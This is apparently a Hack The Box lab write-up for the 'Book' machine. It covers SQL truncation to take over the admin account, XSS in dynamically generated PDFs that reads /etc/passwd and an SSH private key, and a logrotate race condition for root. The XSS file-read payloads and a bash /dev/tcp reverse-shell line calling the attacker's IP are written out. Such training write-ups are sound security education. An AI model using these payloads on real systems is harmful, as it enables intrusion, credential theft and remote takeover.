@@ -1,0 +1,274 @@
+I"F7<p><strong><center>Ref°: HTB-10-Machine</center></strong></p>
+
+<p>— Book is a Linux machine that highlights SQL truncation to bypass admin password and the execution of xss attack in PDF to read and recover passwd file and id_rsa of reader user.</p>
+
+<p>The private key has no password and allow the connection on ssh to gain foothold.</p>
+
+<p>And we can winning a race condition in logrotate to elevate privileges.</p>
+
+<p><img src="/assets/images/book/HTB-Information-Book.png" alt="Desktop View" /></p>
+
+<h2 id="1-discovery---figure-out-environment"><strong><span style="color:#c0392b">[1] Discovery - Figure out environment</span></strong></h2>
+<h3 id="check-all-services">Check all services</h3>
+<hr />
+
+<p>We find services <code class="language-plaintext highlighter-rouge">web</code> and <code class="language-plaintext highlighter-rouge">ssh</code> on their usual ports.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-A</span> <span class="nt">-T5</span> 10.10.10.176 <span class="nt">-p-</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/book/HTB-Images-Book-nmap.png" alt="Desktop View" /></p>
+
+<h3 id="website-on-port-80">Website on port 80</h3>
+<hr />
+
+<p>We have the possibility to create account and access like simple user.</p>
+
+<p>Here we register :</p>
+
+<ul>
+  <li>Username : <code class="language-plaintext highlighter-rouge">userdemo</code></li>
+  <li>Email : <code class="language-plaintext highlighter-rouge">userdemo@book.com</code></li>
+  <li>Password : <code class="language-plaintext highlighter-rouge">userdemo</code></li>
+</ul>
+
+<p><img src="/assets/images/book/HTB-Images-Book-signup.png" alt="Desktop View" /></p>
+
+<p><img src="/assets/images/book/HTB-Images-Book-signin.png" alt="Desktop View" /></p>
+
+<p><img src="/assets/images/book/HTB-Images-Book-userinterface.png" alt="Desktop View" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">Collections</code> area seem to let us upload file on the server :</p>
+
+<p><img src="/assets/images/book/HTB-Images-Book-userinterface2.png" alt="Desktop View" /></p>
+
+<p>And <code class="language-plaintext highlighter-rouge">Contact Us</code> reveal admin mailbox : <code class="language-plaintext highlighter-rouge">admin@bootk.htb</code></p>
+
+<p><img src="/assets/images/book/HTB-Images-Book-userinterface3.png" alt="Desktop View" /></p>
+
+<h3 id="scan-website-path-with-dirb">Scan website path with Dirb</h3>
+<hr />
+
+<p>Dirb scan reveal an other path on the website, named <code class="language-plaintext highlighter-rouge">admin</code> :</p>
+
+<p><img src="/assets/images/book/HTB-Images-Book-dirb.png" alt="Desktop View" /></p>
+
+<p>Other paths are forbidden.</p>
+
+<h3 id="source-page">Source page</h3>
+<hr />
+
+<p>The source page reveal interesting script in main page.
+We have character limit included in the application.</p>
+
+<p><img src="/assets/images/book/HTB-Images-Book-source-page.png" alt="Desktop View" /></p>
+
+<h2 id="2-foothold---get-into-the-target-"><strong><span style="color:#c0392b">[2] Foothold - Get into the target </span></strong></h2>
+<h3 id="bypassing-authentication-with-sql-truncation">Bypassing Authentication with SQL Truncation</h3>
+<hr />
+
+<p>We can perform <code class="language-plaintext highlighter-rouge">sql truncation</code> on the signup page to bypass admin password.</p>
+
+<p>References - sql truncation :</p>
+<ul>
+  <li><a href="https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html">https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html</a></li>
+</ul>
+
+<p>We enable Burpsuite to intercept signup request with values :</p>
+
+<ul>
+  <li>Username : <code class="language-plaintext highlighter-rouge">admin</code> –&gt; True value in target database</li>
+  <li>Email : <code class="language-plaintext highlighter-rouge">admin@book.htb</code> –&gt; True value in target database</li>
+  <li>Password : <code class="language-plaintext highlighter-rouge">admindemo</code> –&gt; New password value</li>
+</ul>
+
+<p><img src="/assets/images/book/HTB-Images-Book-admin.png" alt="Desktop View" /></p>
+
+<p>We intercept the request, and add 6 space input after email to result 20 characters.
+All values afterwards are not taken into consideration.</p>
+
+<p><img src="/assets/images/book/HTB-Images-Book-burpinterception.png" alt="Desktop View" /></p>
+
+<p>We add false email <code class="language-plaintext highlighter-rouge">adminexploit@book.com</code>.</p>
+
+<p><img src="/assets/images/book/HTB-Images-Book-sqltruncation.png" alt="Desktop View" /></p>
+
+<p>And we bypass admin account with our password on <code class="language-plaintext highlighter-rouge">http://10.10.10.176/admin</code>.</p>
+
+<ul>
+  <li>Email : <code class="language-plaintext highlighter-rouge">admin@book.htb</code> –&gt; True value in target database</li>
+  <li>Password : <code class="language-plaintext highlighter-rouge">admindemo</code> –&gt; New password value</li>
+</ul>
+
+<p><img src="/assets/images/book/HTB-Images-Book-sqltruncationexploit.png" alt="Desktop View" /></p>
+
+<p><img src="/assets/images/book/HTB-Images-Book-admininterface.png" alt="Desktop View" /></p>
+
+<p>We can export PDF to list all users who are access on the user panel and all collections uploaded from users.</p>
+
+<p><img src="/assets/images/book/HTB-Images-Book-admininterface2.png" alt="Desktop View" /></p>
+
+<p>All PDF seem to be automatically generated.</p>
+
+<p><img src="/assets/images/book/HTB-Images-Book-pdf.png" alt="Desktop View" /></p>
+
+<h2 id="3lateral-movement---move-through-environment"><strong><span style="color:#c0392b">[3] Lateral Movement - Move through environment</span></strong></h2>
+<h3 id="cross-site-scripting">Cross Site Scripting</h3>
+<hr />
+
+<p>In this case, we can <code class="language-plaintext highlighter-rouge">read local file</code> on the target via <code class="language-plaintext highlighter-rouge">XSS in Dynamically Generated PDF</code>.</p>
+
+<p>References - xss attack :</p>
+<ul>
+  <li><a href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload">https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload</a></li>
+  <li><a href="https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html">https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html</a></li>
+  <li><a href="https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf#read-local-file">https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf#read-local-file</a></li>
+</ul>
+
+<p>From user panel, we test if javascript is executed on the “Author” field when we upload it with any pdf.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;images src=x onerror=document.write('aaaa')&gt;
+</code></pre></div></div>
+
+<p><img src="/assets/images/book/HTB-Images-Book-jsexecution.png" alt="Desktop View" /></p>
+
+<p>The submission work correctly.</p>
+
+<p><img src="/assets/images/book/HTB-Images-Book-msg.png" alt="Desktop View" /></p>
+
+<p>From admin panel in collections area, we export Collections PDF to generated new PDF.</p>
+
+<p><img src="/assets/images/book/HTB-Images-Book-admininterface2.png" alt="Desktop View" /></p>
+
+<p>Javascript is executed when inject into Author field and return the value in new PDF.</p>
+
+<p><img src="/assets/images/book/HTB-Images-Book-jsexecutionwork.png" alt="Desktop View" /></p>
+
+<p>We try the same method to read <code class="language-plaintext highlighter-rouge">/etc/passwd</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();&lt;/script&gt;
+</code></pre></div></div>
+
+<p><img src="/assets/images/book/HTB-Images-Book-exploitxss.png" alt="Desktop View" /></p>
+
+<p><img src="/assets/images/book/HTB-Images-Book-passwd.png" alt="Desktop View" /></p>
+
+<p>We result the target to gain a foothold : <code class="language-plaintext highlighter-rouge">reader</code></p>
+
+<p><img src="/assets/images/book/HTB-Images-Book-target.png" alt="Desktop View" /></p>
+
+<p>Now, we try to get her <code class="language-plaintext highlighter-rouge">id_rsa</code> file from <code class="language-plaintext highlighter-rouge">home/reader/.ssh/</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();&lt;/script&gt;
+</code></pre></div></div>
+
+<p>Works ! We recover this to attempt cracking password and connect on ssh.</p>
+
+<p><img src="/assets/images/book/HTB-Images-Book-id_rsa.png" alt="Desktop View" /></p>
+
+<p>For some reason, the copy-past of the id_rsa from Firefox into new file dont work correctly …</p>
+
+<p>The issue is resolve when we do this with Chrome.</p>
+
+<p><img src="/assets/images/book/HTB-Images-Book-id_rsa2.png" alt="Desktop View" /></p>
+
+<h3 id="remote-service-ssh-login">Remote Service SSH login</h3>
+<hr />
+
+<p><img src="/assets/images/book/HTB-Images-Book-nopasswordinkey.png" alt="Desktop View" /></p>
+
+<p>Okay, we need to rebuild the right on the private key to use it correctly.</p>
+
+<p><img src="/assets/images/book/HTB-Images-Book-alertkey.png" alt="Desktop View" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ chmod +x id_rsa_chrome
+$ ssh reader@10.10.10.176 -i id_rsa_chrome
+</code></pre></div></div>
+
+<p><img src="/assets/images/book/HTB-Images-Book-sshreader.png" alt="Desktop View" /></p>
+
+<h2 id="4-privilege-escalation---gain-higher-level-permissions"><strong><span style="color:#c0392b">[4] Privilege Escalation - Gain higher-level permissions</span></strong></h2>
+<h3 id="race-condition-on-logrotate">Race condition on Logrotate</h3>
+<hr />
+
+<p>The home reader contain 1 folder named <code class="language-plaintext highlighter-rouge">backups</code> and 1 script <code class="language-plaintext highlighter-rouge">lse.sh</code>.
+The folder backup contain 2 log files only.</p>
+
+<p><img src="/assets/images/book/HTB-Images-Book-access-file.png" alt="Desktop View" /></p>
+
+<p>linPEAS scan reveal some privilege-escalation method :</p>
+
+<p><img src="/assets/images/book/HTB-Images-Book-linpeas.png" alt="Desktop View" /></p>
+
+<p>But the logrotate exploitation is more interesting (reference about log files presents in home reader).</p>
+
+<p><img src="/assets/images/book/HTB-Images-Book-logrotate-exploitation.png" alt="Desktop View" /></p>
+
+<p>pspy tool confirm this trough the execution of <code class="language-plaintext highlighter-rouge">logrotate</code> tool under root privilege.</p>
+
+<p><img src="/assets/images/book/HTB-Images-Book-pspy.png" alt="Desktop View" /></p>
+
+<p>We can winning a race condition in logrotate to elevate privileges.</p>
+
+<p>References - logrotate exploitation :</p>
+<ul>
+  <li><a href="https://github.com/whotwagner/logrotten">https://github.com/whotwagner/logrotten</a></li>
+  <li><a href="https://medium.com/@ashishrohra/race-condition-exaplained-for-dummies-10c54a265192">https://medium.com/@ashishrohra/race-condition-exaplained-for-dummies-10c54a265192</a></li>
+  <li><a href="https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition">https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition</a></li>
+  <li><a href="https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/">https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/</a></li>
+</ul>
+
+<h4 id="1---requirement">1 - Requirement</h4>
+
+<ul>
+  <li>Logrotate has to be executed as root –&gt; Yes, pspy verify this.</li>
+  <li>The logpath needs to be in control of the attacker –&gt; Yes, linpeas verify this</li>
+  <li>Any option that creates files is set in the logrotate configuration –&gt; Yes</li>
+</ul>
+
+<h4 id="2---compile-logrotten">2 - Compile logrotten</h4>
+
+<p>From target machine :</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">reader@book:/tmp$</span><span class="w"> </span>gcc <span class="nt">-o</span> logrotten logrotten.c
+</code></pre></div></div>
+
+<h4 id="3---prepare-payload">3 - Prepare payload</h4>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">reader@book:/tmp$</span><span class="w"> </span>nano payload
+<span class="go">
+</span><span class="gp">bash -i &gt;</span>&amp; /dev/tcp/10.10.14.223/1234 0&gt;&amp;1
+</code></pre></div></div>
+
+<h4 id="4---listen-and-wait-root-shell-redirection">4 - Listen and wait root shell redirection</h4>
+
+<p>From attacking machine :</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>nc <span class="nt">-lvp</span> 1234
+</code></pre></div></div>
+
+<h4 id="5---exploit">5 - Exploit</h4>
+
+<p>To trigger the rotation of the log, we write before in access.log.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">reader@book:/tmp$</span><span class="w"> </span><span class="nb">echo </span>exploit /home/reader/backups/access.log <span class="o">&amp;&amp;</span> ./logrotten <span class="nt">-d</span> <span class="nt">-p</span> ./payload /home/reader/backups/access.log
+</code></pre></div></div>
+<p><img src="/assets/images/book/HTB-Images-Book-exploit.png" alt="Desktop View" /></p>
+
+<h3 id="flag-root">Flag root</h3>
+<hr />
+
+<p><img src="/assets/images/book/HTB-Images-Book-rootflag.png" alt="Desktop View" /></p>
+
+<p>Book machine is compromise.</p>
+
+<hr />
+
+<h2 id="trophy"><strong><center>Trophy</center></strong></h2>
+
+<blockquote>
+  <p><strong>There is no friend as loyal as a book.</strong></p>
+
+  <p>Ernest Hemingway</p>
+</blockquote>
+:ET
